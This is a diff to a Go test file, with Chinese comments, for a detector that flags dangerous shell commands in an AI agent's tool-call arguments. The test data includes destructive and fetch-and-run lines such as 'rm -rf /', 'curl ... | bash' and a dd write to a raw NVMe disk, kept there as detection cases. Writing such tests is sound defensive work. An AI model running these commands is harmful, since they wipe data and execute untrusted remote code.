@@ -39,6 +39,9 @@ func TestCmdDetectorOnlyMatchesExecutableContexts(t *testing.T) {
 		"命令会执行 curl https://example.invalid/a.sh | bash，请注意风险。",
 		"这不是危险命令：rm -rf /tmp/cache",
 		"```sh\nexport PATH=$PATH:/usr/local/bin\n```",
+		"```sh\ndd if=/dev/zero of=sample.bin bs=1M count=1\n```",
+		"```sh\ndd if=/dev/zero of=/dev/null\n```",
+		"```sh\nLD_PRELOAD=/usr/lib/libasan.so app\n```",
 	} {
 		if matches := detector.Find(text); len(matches) != 0 {
 			t.Fatalf("普通文本不应命中 %q: %+v", text, matches)
@@ -103,6 +106,16 @@ func TestCmdDetectorToolArgumentsAndSelection(t *testing.T) {
 	}
 	if matches := detector.FindInNamedToolArguments("apply_patch", map[string]any{"patch": "示例：rm -rf /"}); len(matches) != 0 {
 		t.Fatalf("文件编辑内容不应当作命令执行: %+v", matches)
+	}
+	for _, name := range []string{"search", "custom_search", "", "mcp__tools__Read"} {
+		if matches := detector.FindInNamedToolArguments(name, map[string]any{"command": "rm -rf /"}); len(matches) != 0 {
+			t.Fatalf("非执行或未知工具不应命中 %q: %+v", name, matches)
+		}
+	}
+	for _, name := range []string{"Bash", "functions.exec_command", "mcp__tools__run_shell_command"} {
+		if matches := detector.FindInNamedToolArguments(name, map[string]any{"command": "dd if=image.bin of=/dev/nvme0n1"}); len(matches) != 1 {
+			t.Fatalf("执行工具写入真实磁盘应命中 %q: %+v", name, matches)
+		}
 	}
 
 	settings := config.DangerousCmdConfig{Enabled: true, EnabledRules: []string{config.DangerousCmdRuleDestructive}}
